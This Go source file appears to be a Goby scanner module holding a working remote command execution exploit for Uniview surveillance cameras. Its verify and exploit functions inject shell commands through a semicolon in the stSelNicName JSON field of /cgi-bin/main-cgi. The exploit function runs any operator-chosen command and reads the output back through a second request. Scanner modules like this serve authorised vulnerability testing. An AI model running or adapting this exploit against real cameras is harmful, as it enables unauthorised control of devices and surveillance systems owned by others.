package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Uniview Cameras main cgi RCE",
    "Description": "There is a remote command execution vulnerability in many Uniview-Cameras-and-Surveillance, which leads to the attacker can forge specific messages for use and execute system commands.",
    "Product": "Uniview-Cameras-and-Surveillance",
    "Homepage": "http://cn.uniview.com/",
    "DisclosureDate": "2021-06-04",
    "Author": "gobysec@gmail.com",
    "GobyQuery": "app=\"Uniview-Cameras-and-Surveillance\"",
    "Level": "3",
    "Impact": "<p>Attackers can execute any command on the server, write the back door, so as to invade the server, access to the administrator authority of the server, great harm.</p>",
    "Recommendation": "<p>1. The vulnerability has been fixed by the official, please visit the following link, select the correct product model, and download the upgrade package to upgrade:</p><p><a href=\"https://cn.uniview.com/Service/Service_Training/Download/Tools/\">https://cn.uniview.com/Service/Service_Training/Download/Tools/</a></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [
        "https://gobies.org/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ip addr"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10200"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(16)
			cfgGet := httpclient.NewGetRequestConfig("/cgi-bin/main-cgi?json=%7b%22cmd%22%3a264%2c%22status%22%3a1%2c%22bSelectAllPort%22%3a1%2c%22stSelPort%22%3a0%2c%22bSelectAllIp%22%3a1%2c%22stSelIp%22%3a0%2c%22stSelNicName%22%3a%22%3becho+" + randStr + ">+%2Ftmp%2Fpacketcapture.pcap%3b%22%7d")
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.VerifyTls = false
			respGet, _ := httpclient.DoHttpRequest(u, cfgGet)
			if respGet.StatusCode != 200 {
				return false
			}
			cfgRes := httpclient.NewGetRequestConfig("/cgi-bin/main-cgi?json=%7b%22cmd%22%3a265%2c%22szUserName%22%3a%22%22%2c%22u32UserLoginHandle%22%3a-1%7d")
			cfgRes.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgRes.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfgRes); err == nil {
				return resp.StatusCode == 200 && (strings.Contains(resp.Utf8Html, randStr))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			enRce := url.QueryEscape(fmt.Sprintf("%s", cmd))
			uri := "/cgi-bin/main-cgi?json=%7b%22cmd%22%3a264%2c%22status%22%3a1%2c%22bSelectAllPort%22%3a1%2c%22stSelPort%22%3a0%2c%22bSelectAllIp%22%3a1%2c%22stSelIp%22%3a0%2c%22stSelNicName%22%3a%22%3b" + enRce + ">+%2Ftmp%2Fpacketcapture.pcap%3b%22%7d"
			cfgGet := httpclient.NewGetRequestConfig(uri)
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.VerifyTls = false
			respGet, _ := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet)
			if respGet.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "Maybe the Target was not Vulnerability\nPlease try again or Check the target"
				return expResult
			}
			cfgRes := httpclient.NewGetRequestConfig("/cgi-bin/main-cgi?json=%7b%22cmd%22%3a265%2c%22szUserName%22%3a%22%22%2c%22u32UserLoginHandle%22%3a-1%7d")
			cfgRes.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgRes.VerifyTls = false
			cfgRes.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgRes); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
